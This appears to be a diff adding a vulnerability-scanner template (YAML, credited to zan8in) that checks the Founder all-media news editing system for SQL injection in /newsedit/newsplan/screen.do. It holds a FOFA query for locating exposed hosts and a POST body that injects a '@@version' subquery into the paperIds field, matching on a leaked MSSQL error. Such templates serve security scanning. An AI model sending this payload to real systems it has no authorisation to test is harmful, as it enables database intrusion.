@@ -1,0 +1,21 @@
+id: founder-screen-do-sqli
+
+info:
+  name: 方正畅享全媒体新闻采编系统 screen.do sql注入
+  author: zan8in
+  severity: high
+  verifide: true
+  description: |-
+    方正畅享全媒体新闻采编系统 screen.do sql注入
+    fofa: app="FOUNDER-全媒体采编系统"
+  tags: 方正,方正畅享全媒体新闻采编系统,sqli
+  created: 2025/03/10
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /newsedit/newsplan/screen.do
+      body: method=getPaperLayoutList&pageNo=1&pageSize=5&paperDate=2022-11-30&paperIds=123+AND+2675+in+(select+@@version)&terminalType=123
+    expression: response.status == 200 && response.body.ibcontains(b'"error_info":') && response.body.ibcontains(b"microsoft sql server")
+expression: r0()
